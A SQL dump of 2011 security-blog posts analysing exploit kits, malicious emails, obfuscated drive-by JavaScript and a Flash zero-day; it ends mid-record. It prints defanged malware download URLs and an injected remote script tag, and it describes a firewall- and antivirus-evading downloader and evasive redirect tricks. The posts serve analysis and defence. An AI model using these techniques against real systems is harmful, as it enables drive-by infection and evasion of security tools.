INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (148, 'Amusing UPS/Fedex Malicious Email', 'darryl', 'May 11, 2011', 'Yesterday I received this UPS email with a malicious zipped attachment.\n\nA couple hours later, I get another one. This one had Fedex content but the “from” and “subject” lines were still showing “UPS”.\n\nAnother two or so hours pass and a third one arrives. They got the content and “from” line correct but the “subject” line is still wrong.\n\nThen several hours later, all of the fixes are made and the final “fake” Fedex email arrives.\n\nThe attachment, “parcel information.exe”, when uploaded to VirusTotal shows over 52% coverage.\n\nIf it’s executed, a new binary, “pusk.exe” is dropped and contacts two additional servers:\nhxxp://variantov.com/pusk.exe\nhxxp://searchand.org/404.php?type=stats&affid=531&subid=01&awok\nhxxp://searchboth.org/pica1/531-direct \nThe binary makes changes to the system so certain functions don’t work (like accessing Task Manager). It also scans browser history files and pretends to find errors on the PC.\n\nThis particular binary has very low coverage on VirusTotal:', 'fedex, malware, ups', 'http://www.kahusecurity.com/?p=387\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (149, 'New (Unknown) Exploit Kit', 'darryl', 'May 8, 2011', 'Here’s yet another new kit but I don’t have much on this including whether this is still being offered for sale/rent. In fact, if anyone knows its name, drop me a note.\n\nThis kit offers the following exploits:\nMDAC, SpreadSheet, SnapShot, Aurora, CSSClip, IEPeers, PDF LibTiff, PDF GetIcon, PDF CollectEmail, JAVA, Shockwave, and AOL\nThe panel looks broken in this screenshot but it does show it’s of Spanish origin.\n\nUPDATE\n======\nA reader just posted the name of the kit…appropriately named the “Mushroom Exploit”.', 'exploit kit', 'http://www.kahusecurity.com/?p=370\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (150, 'New Exploit Kit – EgyPack', 'darryl', 'May 5, 2011', 'First off, many thanks goes out to Paul for doing all of the legwork on this new discovery!\nA new pack has emerged called EgyPack.\n\nThe malicious link points to, what looks like a JPEG file (careful, it may still be live):\nhxxp://img130.imagehacks.es/img130/801/banner.jpeg?id=f8cdedaf861396068a58ab5a7f026e74\nBut it’s hardly an image file:\n\nThe author(s) appear to be very much into self-promotion as “egypack” is in a lot of places in the Javascript code. It uses a technique to grab content from textarea and div containers to build the final exploit code. You might have seen this technique used by other famous kits like PEK.\nHere are some shots that show a cleaned-up version of the code:\n\n\nThere were several obfuscation methods used in this code but it was predominately character replacements wrapped in an onion. After peeling one of three layers, you get this. I would say that this is the heart of their decryption routine.\n\nHere’s an example of one portion of the code that gets transformed twice to get to the final code:\n\nThe Java exploit appears to be CVE2010-0886 and downloads a DLL file called “jvm.dll”. When you disassemble this file, you will find that this too is a downloader.\n\nIt does a GET with the user-agent string of “Egypack/1.0” and a keep-alive time of 300 then drops a binary file called “egy.exe” to the %appdata% folder. Unfortunately, the site was not working so I can’t confirm its behavior nor what the final malware was.\nHere’s a link to a Pastebin of one of the files of the pack:\nhttp://pastebin.com/f6aca1ef9', 'egypack, exploit kit, javascript, obfuscation', 'http://www.kahusecurity.com/?p=358\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (151, 'Wild Wild West Update', 'sectek', 'May 1, 2011', 'i got a lot of responses on my graphic so i’m posting an update with the feedback i got.  i would like to keep this current so if you know of new kits not here, pls send me email at sectek at live.com.\nsince the exploit pack topic is popular on this blog, i gonna put out a request for the following kits and have the other guys here analyze it.  if you can contribute, that’ll be really cool!\napache, black hole 1.1, bleeding life v2 reloaded, bomba, clean pack, dragon pack, eleonore 1.6.3, g01pack, impact, incognito, ipack, justexploit, katrin, kyuss, lupit, max toolkit, needle, neosploit, pek 2.6, robopak, shaman’s dream, siberia 2.0, yes 4.0', 'exploit kits', 'http://www.kahusecurity.com/?p=344\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (152, 'Malscript on Compromised Site', 'darryl', 'April 29, 2011', 'From the looks of it, the catholic.org site appears to have been compromised in some way. There is obfuscated Javascript buried in the webpage that points to a malicious domain. Thank goodness that the malicious domain no longer resolves so it’s not causing any harm. Let’s hope that the webmaster can quickly identify the cause the close the hole to prevent a re-hack.\nHere’s a shot of their front page:\n\nLike most campaigns we are seeing today, you need to visit the website via a search engine first for the malicious script to activate. I searched for the site on Google then clicked on the link (searching via Bing works too).\n\nAnd the malicious Javascript appears in the page:\n\nThe script has a lot of junk in there for misdirection. In fact, probably 60% of the code is just garbage. When analyzing this code, I noticed that the authors defined the variables for the legit code so identifying the good from the bad was actually very easy. Here’s the cleaned up, valid code which now makes it very easy to follow:\n\nThis script created the following:\n<script type=’text/javascript’ src=’hxxp://moatvox.co.cc/xlhdhezxwawrvz43/’></script>\nSince the malicious site is down, I don’t know what it was doing. Perhaps rogueware or an exploit kit?', 'javascript, obfuscated', 'http://www.kahusecurity.com/?p=327\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (153, 'Impressive Javascript Encoder', 'darryl', 'April 27, 2011', 'There are many online Javascript encoder sites that enable you to obfuscate your Internet link or email address. Most of the Javascript encoders that I’ve seen don’t pose much of a challenge and are really easy to reverse. I recently came upon HiveLogic’s Enkoder and this one is well made!\n\nThe HiveLogic Enkoder can be found here. And you are able to encode either your email address or any HTML content you choose.\nI will have it encode a simple redirect to Google.\n\nAnd what it spits out is pure insanity!\n\nHere’s what the entire script looks like. Simple and straightforward, no?\n\nIt is deceptively challenging. I won’t spoil your fun but for those who like reversing Javascript, give it a try. There’s an easy “cheat” to produce the final redirect script in one pass but you should try to understand what’s happening and go through it manually.\nYou will eventually get to this result which is one step away from the final rendering. One thing to note is that his encoder produces a new variant each time so no two will be alike at least from what I can tell (the main functions stay the same but the variables and garbled text are different).\n\nHave fun!', 'encoder, hivelogic, javascript, obfuscation', 'http://www.kahusecurity.com/?p=314\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (154, 'UPS Scam Email Links to Black Hole', 'darryl', 'April 23, 2011', 'Here we see a fake UPS email suggesting that a package has arrived.\n\nRecipients of this scam email may be inclined to click on one or both of the links. The first link does take you to ups.com. The second one leads the recipient to an exploit kit.\nA common, innocent-looking 404 page not found error appears. Oh well, I guess the link is broken…\n\nNot quite. The page is in fact rigged to deliver malware. Look closely and you’ll even see the iframes embedded on the page. Viewing the source code reveals the ugly truth.\n\nThe bottom part of the page holds the script that converts the seemingly random characters above into malicious content.\n\nMost of the code is nonsense and merely tries to make itself look innocent (or it could be a way to evade Javascript analyzers which I didn’t pursue).\nThe function “createCSS” and the middle portion with the for..loop that calls it stores a value of “va” in a variable which is combined later to form “eval”. It also arranges to have “string.fromCharCode” stored in a variable for later use. The real meat is the portion at the very bottom and it is here that the exploit kit author has done something very interesting…\nThe variable “zueiw” is assigned “eval(‘eval’);” which turns it into a function:\nfunction eval() {\n[native code]\n}\nThe next line assigns the strange-looking values that dominates the page’s source code to the “aa” variable. This is then passed to the above eval function with surrounding left and right brackets. This transforms “v*6.25,v*6.9375,v*6.1875,v*7.3125…” into “100,111,99,117…” WTF?!? It’s magic!\nNot magic. But clever programming!\nA couple of lines up there from here are these two lines:\neeq = new Date(2010,11,3,2,21,4);\nv=eeq.getSeconds() * 4;\nThe variable “v” contains the value of 16. The eval function evaluates v*6.25 (or 16 x 6.25) to equal 100.\nThe for..loop at the very end of the script then converts the decimal values to ASCII characters and when put all together, results in the following:\n\n\nThe Black Hole Exploits Kit is quite popular with hackers and its widespread use is evidence of that. The current version appears to be 1.1.0.\nThe exploits include:\n* MDAC – IE 5-6, Windows 98/me, 2000, 2003, XP\n* HCP – IE 7-8, Windows 2000, XP\n* PDF – Acrobat Reader v. 6-9.2, works on all browsers\n* PDF LibTiff – Acrobat Reader v. 8-9.3, works on all browsers (bypasses ASLR + DEP)\n* Java SMB – Windows 2000, 2003, XP, Vista, 7 Java SMB, all browsers\n* Java OBE – Windows 2000, 2003, XP, Vista, 7 Java OBE, all browsers\n* Java TRUST – All browsers\n* Java SKYLINE – IE\nHere’s a shot of the statistics page:\n\nAnnual License: $ 1,500\nSemiannual License: $ 1,000\n3-month License: $ 700\nRent for one month: $ 500\nRent for one week: $ 200', 'black hole, email, ups', 'http://www.kahusecurity.com/?p=293\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (155, 'Flash 0Day Found in Drive-By', 'darryl', 'April 22, 2011', 'The recently announced Adobe Flash 0day exploit (CVE-2011-0611) has been found in the wild as a drive-by download. The exploit targets Adobe Flash Player version 10.2.153.1 and works quite reliably.\nHere’s a portion of Javascript code for an exploit shared with me by fellow security researcher, Ben (thanks for the share!). You can see the NOP sled being setup in the “nb1” function. (There are several versions of this and are different in nature; one is an IE Behaviors exploit and another is the flash one…still need to research.)\n\nThe bottom portion of the script is dedicated to the shellcode.\n\nAfter dumping the shellcode, you can see the URL at the end which installs the malware. \n\nAnother version of the exploit code can be found on a prominent Korean news site. A hidden iframe is embedded in their webpages. The Javascript is significantly different than the one above but performs the same exploit.\n\nA key part of this exploit code is held in a separate Javascript file. The code sets up the NOP sled.\n\nThe resulting malware that gets installed on the unsuspecting victim’s PC looks to be some kind of game stealer and is detected by 18 of 42 anti-virus engines (42.9% coverage).\n\nThere were clues in the exploit code, tool marks if you will, that helped me find what I think is the exploit generator program. It’s in Chinese. After you enter your login credentials, you get this screen where you enter the URL of your malware.\n\nI found yet another tool made by the same folks that appears to have made the Flash exploit tool. They share the same skin but this tool uses a different exploit to deliver malware.\n\nI’ll try to get more information and post it here.', '0day, adobe, CVE-2011-0611, drive-by download, flash, shellcode', 'http://www.kahusecurity.com/?p=277\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (156, 'Wild Wild West', 'sectek', 'April 19, 2011', 'since there seems to be a lot of interest in attack toolkits, i grabbed the logos from various kits in our zoo (and from the internet) and put this together.  corrections and additions can be sent to sectek at live dot com .', 'exploit kit, logos', 'http://www.kahusecurity.com/?p=264\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (157, 'Yes Exploit Kit Upgraded', 'darryl', 'April 14, 2011', 'The author(s) of the Yes Exploit System has quietly upgraded their kit to version 4.0. The admin panel has a slick-looking GUI that is heavy on the graphics. The kit apparently is able to punch all Windows systems (Win9x – Windows 7, 32-bit or 64-bit) as well as all browsers with vulnerable plug-ins. Additionally, the kit supposedly encrypts exploits on-the-fly and are FUD.\nHere’s a look at the panel:\n\nHere are the exploits available with this kit:\n* MDAC\n* Collab.collectEmailinfo\n* Util.printf\n* Iexml\n* Java Calendar\n* Iepeers msiemc\n* PDF open\n* Telnet\n* Collab.getIcon\n* Flash 9\n* Flash 10\n* NewPlayer\n* PDF Libtiff\n* Java getval\n* PDF SWF\n* Quicktime\n* HCP\n* Cooltype\nThe current version costs 400 LR.\nI haven’t seen this in the wild but if you have, please send me the URL.', 'yes exploit system', 'http://www.kahusecurity.com/?p=260\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (158, 'BleedingLife Malvertisement Campaign', 'darryl', 'April 11, 2011', 'This particular malvertisement shows that hackers are being a little more sneaky. Here’s an innocent website that was involved in a drive-by recently.\n\nThe source code reveals little. You could easily dismiss the Javascript as typical code for an ad. Usually, you’d see an obvious iframe tag to a suspicious-looking domain.\n\nBut following the link leads you to the ad page where things become much more clearer.\n\nLet’s have a look at the suspicious code at the bottom of the page.\n\nThe obfuscation won’t make your head hurt but it is quite clever and uses a couple of new techniques to throw you off. It first starts off by defining two arrays with one containing hex values and the other decimal values. A new array is then created that joins the first two arrays. What you get is this:\n185,79\n41,9d\n462,66\nand so on…\nIt then sorts the array to put the values in the right order. Nice.\n0,7a\n1,b1\n2,a1\nNext, it prepends an % character then joins them all up. You end up with this:\n\nThe hex values are sent to a function where they are unescaped.\n\nWe’re nearing the finish line. Down at the very bottom, the “Iye” function gets the hex value from the array, one at a time and also a decimal value of 62. The function then sends its own array up to the “DCl” function where each decimal value does a look up for a character from the “Muk” variable. The “Iye” function does it again for its second array. This is the line I’m referring to:\njnf[mGZ] = String[DCl([11, 21, 24, 36, 22, 10, 8, 21, 22, 24, 56, 32], 0)](te3[DCl([28, 10, 8, 21, 22, 24, 56, 32, 2, 44], 0)](mGZ) – Tka);\nWhat it translates to is “fromCharCode” and “charCodeAt” which basically turns the above line into the following:\njnf[mGZ] = String.fromCharCode(te3.charCodeAt(mGZ)-Tka);\nWhat this line does is subtract 62 from the value 122 (which is the 7Ah from above) and converts it to “\nThe iframe calls up a TDS server and you get sent to another server that delivers an exploit that’s appropriate for your browser/PC. The exploit kit used in this campaign is called BleedingLife v2 Reloaded, which is the sixth iteration of the kit.\n\nVariants: BL v1, BL v2, BL Mini-Java, BL Java Edition, BL Adobe Edition, and now BL v2 Reloaded.\nExploits in this version:\nCVE-2008-2992\nCVE-2010-0188\nCVE-2010-0842\nCVE-2010-1297\nCVE-2010-2884\nCVE-2010-3552\nJavaSignedApplet (requires user interaction but can be disabled)\nAll exploits bypass ASLR and DEP where needed\nBleedingLife v2 Reloaded costs $400 to new buyers.', 'bleedinglife, malvertisement', 'http://www.kahusecurity.com/?p=242\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (159, 'Cyber Security Tips', 'sectek', 'April 7, 2011', 'just wanted to put out a cyber security tip sheet i created for my company.', 'cybersecurity, security awareness, tipsheet', 'http://www.kahusecurity.com/?p=231\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (160, 'Robopak Exploit Kit', 'darryl', 'April 3, 2011', 'Looks like a new exploit kit is making its rounds. The seller is actually a service provider and the toolkit is used as a kind of EaaS (“Exploits as a Service”). The kit includes several Java, PDF, and IE exploits in its arsenal. The rental fee is: $30 per day, $150 per week, and $500 per month.\nHere’s how the statistics page looks like:\n\nThe exploit code is wrapped in obfuscated Javascript which looks like a complete mess:\n\nYou need to decrypt this in two separate parts. First, you need to figure out the script at the very bottom. If you do, you will be rewarded with this:\n\nNow you need to copy the top part of the first script and paste it into the resulting second script.\n\nThen the exploit code can finally be revealed.\n\nI thought this was yet another version of Siberia but apparently it’s not. There appears to be some overlap in the code though.', 'exploit kit, robopak', 'http://www.kahusecurity.com/?p=206\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (161, 'Javascript Obfuscation Using Colors?', 'darryl', 'April 1, 2011', 'No, not at all but the Javascript code does look like it’s just trying to process hexadecimal representations of various colors. Let’s take a closer look at the script:\n\nIf this was found on a webpage, you might just overlook it as something benign. It’s a clever concept!\nIt starts off by defining an array of hexadecimal values which look like a representation of different colors.\nnew Array(‘#4b8272′,’#81787f’,’#832f83′,’#887f74′,’#4c3183′,’#748783′,’#3e7970′,\n‘#857082′,’#728178′,’#7f8331′,’#2f8281′,’#724c31′,’#778383′,’#7f493e’,’#3e7a84′,\n‘#82837e’,’#40403d’,’#727e7c’,’#3e7982′,’#3e7980′,’#847481′,’#883d7c’,’#787d3d’,\n‘#7f777f’,’#314d00′);\nThe function “div_pick_colors” concatenates them into one long string after ignoring the pound sign. You end up with this:\n4b827281787f832f83887f744c31837487833e79708570827281787f83312f8281724c317783\n837f493e3e7a8482837e40403d727e7c3e79823e7980847481883d7c787d3d7f777f314d00\nThe same function then grabs two characters at a time and does some fancy footwork to convert it into a malicious redirect. Here’s the code that does the conversion:\ns += String.fromCharCode(parseInt(c_clr, 16) – 15);\nLet’s go through this quickly…\nGet the first two characters from the string above (which is “4b”).\nConvert it from hexadecimal to decimal (you’ll get “75”).\nSubtract 15 from the decimal value (which is “60”).\nNow convert the decimal value to ASCII (you’ll end up with “\nThe rest of the code appends the date/time value to the URL and executes the code.\nIn case you’re wondering what those hexadecimal values actually look like if they rendered into colors, well it looks like this:\n\nIt kinda looks like a scarf I got for Christmas.', 'deobfuscation, javascript', 'http://www.kahusecurity.com/?p=197\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (162, 'ZeuS Source Code for Sale', 'darryl', 'March 26, 2011', 'Some time ago, it was rumored that the ZeuS author gave his code to the SpyEye author. Well, it looks like another party may have got it too. The following screenshots do look authentic:\n\n\n\nThe source is C++ and supposedly contains everything. The seller is asking for 5500 WebMoney/LibertyReserve for the full source code of version 2.0.8.9.\nUpdate\n=====\nApparently this is real. The source code has been leaked but the archive is password-protected. Now there’s a race to see who can crack the password. In addition, someone has even given out an MD5 hash of the password. Dunno if it’s legit but it’s certainly making this an interesting race indeed.', 'source code, zeus', 'http://www.kahusecurity.com/?p=185\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (163, 'New (Unknown) Exploit Kit', 'darryl', 'March 26, 2011', 'A new exploit kit is being used though it doesn’t seem as popular as Incognito, Black Hole, and others. I don’t know the name of it but the malicious Javascript it uses is quite the piece of work. \nHere’s the top part of the script. The technique it’s using here is to switch the characters around.\n\nNear the bottom of the script is the second section that uses another technique. This code XORs a bunch of decimals. What’s new here is that it uses a different XOR value for each section.\n\nYou have to deobfuscate the bottom part first to be able to decrypt the top portion. If you do this right, you end up with the following code.\n\nThen you add the top part over to this script and you can decrypt the entire code.\n\nThe final code uses several exploits to compromise a PC during its drive-by: Java, Acrobat (two versions), and HCP using Real and Windows Media Player.\nBy the way, I did want to thank the two people who were kind enough to share their kits with me. While the kits weren’t new, they will still provide me several hours of research fun. If there are others who are willing to share (especially if they have Incognito), please send me an email.', 'exploit kit', 'http://www.kahusecurity.com/?p=177\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (164, 'Incognito Exploit Kit Redux', 'darryl', 'March 7, 2011', 'After posting the previous article on Incognito, I was told by a couple of people that this was an older version (many thanks guys). I have been tracking that exploit kit for awhile and never got around to posting an article on that kit until now.\n<request>This is a long shot but I would like to ask those in the scene to share this kit with me. I won’t use it nor sell it, I just want to analyze it. And if you want me to keep it private, I will of course honor your request. And since I’m asking, I’ve always wanted to analyze the following kits (some old, some new) but never been able to find them: Golod, Lupit, Impassioned, Blackhole, iPack, Apache, JustExploit, Dragon, Napoleon, Liberty, Intoxicated, Shaman’s Dream, SEO, Bomba, and Siberia. I would gladly trade but looking at this list, I doubt I would have anything you’d want.  Anyway, you can email it to kahu.security[at]gmail.com if you’re feeling generous. Thanks in advance!</request>\nAnyway, there’s one kit that I’ve been tracking since the beginning of the year but I can’t find any information on it. The URLs all look like this:\nwebsite/in.php?a=QQkFBg0BAAEHAAAFEkcJBQYNAQABAwIGAA==\nwebsite/in.php?a=QQkFBg0DBwYNAwwFEkcJBQYNDAYMAwQNAA==\nwebsite/in.php?a=QQkEEkcJBQQEBAQF\nA couple people think it’s an updated version of Dragon Pack while others say it’s a newer version of Incognito. After doing some research, it appears to be Incognito. And the author has done a lot of work on the Javascript obfuscation and changed it out…not just once, not twice but at least three times!\nThis is how the Javascript exploit looked like in January. Here’s the top part which shows the scrambled text that contains the exploit code:\n\nThis is the bottom part which deobfuscates the text:\n\nHere’s a cleaned up version of the Javascript:\n\nOnce you decrypt it, you get this:\n\nHere’s the second iteration of Incognito that I noticed a few weeks later. This is the top part:\n\nAnd here’s the bottom part:\n\nHere’s the cleaned up version:\n\nAfter you deobfuscate it, you come up with this:\n\nHere’s the third iteration of the obfuscated script:\n\nAnd this is the bottom part:\n\nLet’s clean this up so it’s readable. This is the top part of the script.\n\nThis is the bottom part which holds to key to cracking it. The function “BaqyjOvaxube” does the decryption. The variable “PubIjyqid” is defined and then used as an accumulator. We can add the “document.write(PubIjyqid)” statement to grab the result of the function which is a Unicode dump.\n\nAll we need to do now is convert UTF7 to text and we get the following exploit code:\n\nAs you’ll notice, the author uses the same exploit code but creates a new obfuscation routine every month or so in order to bypass anti-virus, web filters, and IDS. \n\nI suppose that the Incognito author is performing the monthly cleaning as part of his package and obviously holding up his end of the deal. I guess that means another version should be out in a couple of weeks.', 'exploit kit, incognito', 'http://www.kahusecurity.com/?p=155\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (165, 'Incognito Exploit Kit', 'darryl', 'February 25, 2011', 'Incognito is a relatively new exploit kit. \n\nIt uses the following Javascript code to perform its drive-by downloads.\n\nLet’s take a closer look at the obfuscated Javascript. As you can see, it’s using arrays like crazy.\n\nThere are three functions. The function at the top is used to decrypt the function at the bottom. The ‘domama’ array translates to “eval from char code” which is used later. The function at the center holds the main code. It’s rather long so it’s likely to be exploit code rather than a redirect script.\n\nThe main decryptor is at the very bottom of the following screenshot. It is taking the large array of decimal numbers to pluck out the individual decimal values of the final script from the small array near the bottom. So the first value of ‘1’ extracts the decimal value of ’13’, the second value of ’29’ extracts the decimal value of ’10’. Here’s what you end up with.\n\nWhen you convert the decimal values to text, you get the deobfuscated final script.\n\nThis one here appears to either borrow the Java exploit from another exploit pack called “Bomba” or it’s the same author who’s reusing code…or neither I suppose. At any rate, what gets installed on the victim’s PC is ZeuS.', 'bomba, exploit kit, incognito, zeus', 'http://www.kahusecurity.com/?p=149\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (166, 'Using IE as a Malware Downloader', 'darryl', 'February 12, 2011', 'I recently sat in on a presentation that discussed how a malicious program was converted (and XOR’d) into a binary file. A second program downloaded the seemingly innocuous binary file and converted it back to the original malicious program on the desktop then executed it. This was to evade perimeter security. While this technique isn’t new, I thought it would be cool to write my own POC.\nGetting a malicious file past IDS and anti-virus isn’t very hard and the technique described at the presentation isn’t all that necessary. You can use a FUD packer/crypter or make your own. But one additional stumbling block that wasn’t mentioned in the presentation was how it circumvented the desktop’s software firewall.\nThere are several ways to get past a personal firewall such as DLL injection, BHO, etc. You can even try to kill the firewall by stopping the service or terminating the program. These methods either require admin rights or may trigger AV’s heuristics engine. I wanted to see if there was another way to do this without getting too complicated.\nAnyway, here are my goals for this evening’s project:\n 1) Bypass the personal firewall;\n2) Not require admin rights;\n3) Make the download transparent to the user; and\n4) Get it past AV’s heuristics engine.\nGiven these goals, I thought that I would leverage Internet Explorer since the user would have permitted this program in their firewall. One method that I thought I would use is Microsoft’s OLE Automation. With Automation, I can launch IE and set the visibility flag to false which means no windows will show up. The limitation of using Automation is that if I want to download a file like a picture or another executable, a “Save As” dialog box appears and waits for the user to proceed with or cancel the download. However, I can save HTML (or text) to a file without any dialog box appearing.\nNow I need to figure out how to convert the EXE file I want to download into a text file. I could convert the executable to hexadecimal but I’m afraid that IDS or AV would detect it as it’s being downloaded. The next best thing would be to UUencode the file or convert it to Base64. I already had code for encoding/decoding Base64 so I thought I would use that.\nSo here’s the plan: Convert the EXE file to Base64 and upload it to a website. Then let the downloader program download it and save it as a text file. The downloader will then convert the Base64 text to binary, save it as an executable, and then execute it.\nHere’s the partial code in VB:\n\nAnd here’s an excerpt of the Base64 file of the downloaded executable:\n\nThe advantage of using text (Base64) is that I could use rot, xor, or some other bitshift method to obfuscate the text to make extra sure IDS and AV can’t detect it. If I wanted to be fancy I guess I could do all this in memory so the downloaded file and resulting executable never touches the hard drive and increase the chances of success.\nAnyway, it works! On XP and Windows 7, no IE window appears, no dialog box, no UAC, no alerts and the code is downloaded and executed. Of course there’s other/better ways to accomplish this but this met my goals. And now I have a program I can use for demonstrations and a future pentest.', 'downloader, firewall, IE Automation, Internet Explorer, security bypass', 'http://www.kahusecurity.com/?p=142\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (167, 'Making Wacky Redirect Scripts – Part III', 'darryl', 'January 31, 2011', 'This post is the third and final entry of redirect scripts I wrote to test my Javascript Analyzer program.\n1. We all know about how to convert IP addresses to decimal. This script has the decimal value of Google’s IP address in the variable “a” but it’s mixed up. All I did was extract the numbers I need and concatenated them into the final decimal value then eval’d it.\n\n2. Similar to the above, I take the decimal value of Google’s IP address but then I convert it to binary. The variable “img5” actually contains the binary value. Just ignore the flowers and toes and you’ll see that the equal sign are the zeros and the other characters are ones. Ahh, do you get it now?\n\nAnd the parseInt function converts the binary value back to decimal.\n3. This script takes the ASCII values of printable characters and makes it into a two-dimensional array. The last chunk of code merely locates the x and y coordinates and pulls in the character to form the redirect.\n\n4. All I did here was convert the redirect code to a higher bit value using the bitwise exclusive OR and then converting it back down.\n\n5. In this script, the alphabet is put into a multi-dimensional array. It’s actually an array inside another array. The variable “a” holds the domain name which is eval’d and executed.\n\n6. The decimals that you see in the following is the redirect code but offset by a value of five. What the code does is decrement the decimal values, convert it to text, then tries to eval it. If it errors then it repeats the function. It keeps doing it until the eval is valid which performs the redirect.\n\nThere doesn’t seem to be a straightforward way to reset variables and reuse them in Javascript. If anyone knows how, please let me know.\n7. There are certain Javascript keywords that make it look suspicious, such as document.write and eval. Obfuscating these keywords is common among malicious scripts. In this technique, I enumerate Javascript elements found in “this” and call out the ones I want to use by finding those that match a certain letter or length. By doing this, you don’t see suspicious keywords but it performs the redirect action I want.\n\nThe final script reads: this.document.write(this.location.href=”http://google.com”);\n8. This last one uses a weird technique that I take no credit for. It relies on using arrays to extract letters from built-in Javascript functions. I left in some hints in here for you but it’s possible to produce a script that uses no alphanumeric characters. This one really hurts my brain.', 'deobfuscation, javascript, redirects', 'http://www.kahusecurity.com/?p=138\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (168, 'Making Wacky Redirect Scripts – Part II', 'darryl', 'January 22, 2011', 'This post is the second part of my quest to test a Javascript Analyzer program I wrote.\n1. This script shows the GNU General Public License in the HTML body. The script below reads in the DIV’s innerHTML value and then goes to a specific position in that text to extract a character. This is repeated until all the characters are concatenated to form a script that redirects the user to Google.\n\n2. The Data URI scheme allows you to include data inside of your webpages using Base64 encoding. Web developers typically embed graphics into their webpages to reduce load times. Here’s an example of embedding a graphic file into a webpage. \n\nWhen this webpage is viewed, however, you don’t see any graphic and your browser gets redirected to Google. What happens is that since I defined the data as “text/html” (as opposed to “image/jpeg”), the base64-encoded text is processed as HTML. You can see that I’ve modified the graphic file by adding a script at the end then converting this file to Base64.\n\nYou can even encode Javascript as Base64, define the data appropriately, and add that to your webpage.\n\n3. Using the same modified graphic files as above, I call it using the Object function and define the data as “text/html”.\n\nHere’s a less obvious example.\n\nAll this does is open the image file as HTML and render the script which performs the redirect.\nWhat I did was modify the graphic file using a hex editor and added the script tag at the end. By doing this, the graphic remains untouched and still renders correctly.\n\n4. Here’s yet another way to redirect the browser to a website. This is rather simple: I define a couple of variables then force an error. When the browser recovers from the error, the redirect code is executed.\n\n5. Here, I use regex to find a match on a keywords which gets eval’d and executed.\n\n6. For this script, I made a custom object which I can define any way that I want. What I did here was use security buzzwords to make it look like the Javascript code is safe to run.', 'deobfuscation, javascript, redirects', 'http://www.kahusecurity.com/?p=129\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (169, 'Making Wacky Redirect Scripts – Part I', 'darryl', 'January 18, 2011', 'A couple of months ago, I created a program that would analyze Javascript code that obfuscates redirection to malicious websites. I come across a lot of these kinds of scripts so this program will make it easier and faster for me to analyze it. I’m testing it now by throwing a bunch of obfuscated code at it to see how it fares. It’s working rather well but I decided to make my own “malicious” scripts to see if I could evade it. \nThe challenge I posed to myself was to make the redirection scripts look harmless, try out some techniques, and come up with new methods to see if my program could properly analyze it. All of these scripts redirect the browser to Google and were built to work on Firefox.\nI’m not breaking new ground here and there’s probably another dozen or so techniques that I haven’t included that people way smarter than me have figured out (please share if you are one of them). The dozen or so scripts I came up with are very simple and straightforward. I didn’t employ any serious obfuscation or countermeasures, in fact, these are brain-dead simple to analyze/reverse but they are unusual and may give my program a headache while it tries to figure it out.\n1. When I analyze a malicious website, I look for obfuscated Javascript which can be visually detected rather quickly. I admit that when I see search engine analytics, AJAX frameworks, etc, I pass them by because they usually aren’t modified to be malicious. But if I can’t find the obvious malicious script then of course I double-back and scrutinize everything.\nWhat I did here was take Google’s advertisement code which can be found on just about every website out there and modified it in such a way as to redirect the user to Yahoo.com even though it clearly shows Google’s URL. [This is the only script that redirects to Yahoo.com, the rest redirects to Google.com.]\n\nThis script dynamically replaces the HTML body with the HTML code from the Javascript. The key to this is the variable “Google_Ad_Client” which holds a bunch of numbers that when read in three at a time (decimal values) eventually converts Google’s URL to Yahoo’s URL.\n2. JSUnpack is a very good online tool that analyzes Javascript. I came up with several bypass methods some time ago and I’ll try to use the same techniques against my tool. Here’s one such method.\n\n\n3. This technique uses HTML to set a cookie that has the redirect script as its content. An external Javascript file is then used to eval the cookie (I’ve included it in the webpage to make it easier to see).\n\n4. Just like the cookie method above, I’m sure this has been used numerous times before. Here, I replace the browser location history with a URL I want the browser to visit then call it.\n\n5. Using Push and Unshift methods, I formed a redirect in an Array object. I basically start at the center then prepend (push) and append (unshift) characters to form the final script. I also threw in some Pops and Shifts so that the final script formation wouldn’t be that straightforward.\n\n6. Okay, now I’m just getting silly. A common characteristic of obfuscated Javascript is garbled text (random characters) or a long string of numbers. As a challenge to myself, I thought I would try to make a redirect without using the word “script”, random characters, or any numbers.\n\nIn this example, I used the onerror function to run my Javascript code that counts the characters between semi-colons (“;”) to construct code that redirects the user to Google.', 'deobfuscation, javascript, 